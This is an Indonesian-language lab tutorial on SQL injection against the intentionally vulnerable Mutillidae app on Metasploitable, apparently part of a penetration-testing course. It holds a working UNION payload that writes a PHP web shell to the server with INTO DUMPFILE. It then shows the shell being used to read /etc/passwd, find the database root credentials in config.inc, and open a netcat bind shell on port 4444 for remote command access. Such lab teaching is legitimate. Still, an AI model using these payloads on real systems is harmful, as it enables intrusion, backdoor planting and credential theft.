## Lesson 10 - SQL Injection Union Exploit \#3

### \# Inject Backdoor di halaman User Info

* **Step 1** : Buka `http://10.151.36.64/mutillidae/` lalu masuk ke halaman user info. Pilih sidebar. OWASP Top 10 --&gt; A1 - SQL Injection --&gt; SQLi - Extract Data --&gt; User Info
  ![](/assets/lesson-7/VirtualBox_kali_19_12_2017_03_01_34.png)

* **Step 2** : Ubah ukuran text box username menjadi 100% menggunakan inspect element agar text box lebih panjang untuk menuliskan syntax SQL Injection.  
  ![](/assets/lesson-8/VirtualBox_kali_19_12_2017_20_37_43.png)

* **Step 3** : Matikan AppArmor pada Metasploitable OS dengan `sudo /etc/init.d/apparmor stop`
AppArmor dalam OS turunan Ubuntu berfungsi untuk membatasi resource dari aktivitas-aktivitas sistem. Hal ini agar MySQL memiliki akses read/write di directori web app.

* **Step 4** : Membuat Backdoor dengan SQL Union Injection dengan memasukan operasi sql di bawah di dalam textbox **Name** lalu tekan tombol _View Account Details_
```
' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/mutillidae/execute_command.php' -- 
```
Dan jangan lupa untuk menambahkan 1 spasi diakhir, `"-- "`. Operasi ini adalah tidak akan menampilkan hasil, justru Authentication Error. Namun disisi lain akan membuat file **execute_command.php**
![](/assets/lesson-9/injection_result.JPG)


* **Step 5** : Melihat hasil operasi dengan web browser `http://10.151.36.64/mutillidae/execute_command.php` 
![](/assets/lesson-10/backdoor_2.JPG)


### \# Menggunakan Backdoor untuk pengamatan dasar

* **Step 1** : Masukan command linux pada textbox tersebut `whoami; pwd; w`.
**whoami** : melihat username yang digunakan
**pwd** : melihat working directory
**w** : melihar user yang sedang login dan dikerjakan
![](/assets/lesson-10/backdoor_3.JPG)

* **Step 2** : Masukan command linux pada textbox tersebut `cat /etc/passwd` dan `netstat -nao | grep "0.0.0.0:"`.
**cat /etc/passwd** : melihat informasi untuk login, dengan field antara lain Username, Password Existance, User ID, Group ID, Gecos, Home Directory, and Shell
**netstat -nao | grep "0.0.0.0:"** : melihat koneksi port yang sedang berlangsung pada ip 0.0.0.0

![](/assets/lesson-10/backdoor_4.JPG)

Terlihat ada user-user yang potensial untuk diserang seperti user apache, mysql, dll.

![](/assets/lesson-10/backdoor_5.JPG)

Terlihat ada port-port yang biasa digunakan oleh suatu service yang potensial untuk diserang seperti mysql, dll.

### \# Menggunakan Backdoor untuk pengamatan Database

* **Step 1** : Mencari file yang berisi konfigurasi database, dengan execute command `find /var/www/mutillidae | xargs grep -i "dbuser"`.
![](/assets/lesson-10/backdoor_6.JPG)

Terlihat terdapat file `config.inc`, file ini diduga berisi konfigurasi database mysql.

* **Step 2** : Masukan command linux pada textbox tersebut `cat config.inc | grep -v "<?php"`. Hal ini dilakukan untuk melihat file sebab jika kita tidak gunakan `grep` web tidak akan mencetak nya karena file berisi script php
![](/assets/lesson-10/backdoor_7.JPG)

Tercatat :
**host** : localhost atau 0.0.0.0
**user** : root
**password** : (kosong)
**nama database** : owasp10

### \# Menggunakan Backdoor untuk pengamatan Netcat

* **Step 1** : Masukan command linux pada textbox tersebut `which nc; netstat -nao | grep 4444 | wc -l`.
**which nc** : melihat dimana netcat berada
**netstat -nao | grep 4444 | wc -l** : melihat jumlah semua koneksi ke port 4444
![](/assets/lesson-10/backdoor_8.JPG)


* **Step 2** : Masukan command linux pada textbox tersebut `mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe`.
**mkfifo** : proses dapat saling berkomunikasi dilakukan melalui pipes. Pipes dapat dibuat dengan mengunakan perintah ini
**nc -l 4444** : meminta netcat untuk listen & allow connections di port 4444
![](/assets/lesson-10/backdoor_9.JPG)

Terlihat koneksi terus berputar hal ini manandakan port 444 sedang listen atau menunggu adanya koneksi/transfer data

* **Step 3** : Sembari langkah 2 berjalan, masukan command linux pada terminal Kali Linux `nc 10.151.36.64 4444`. Kemudian masukan command cli yang anda inginkan.














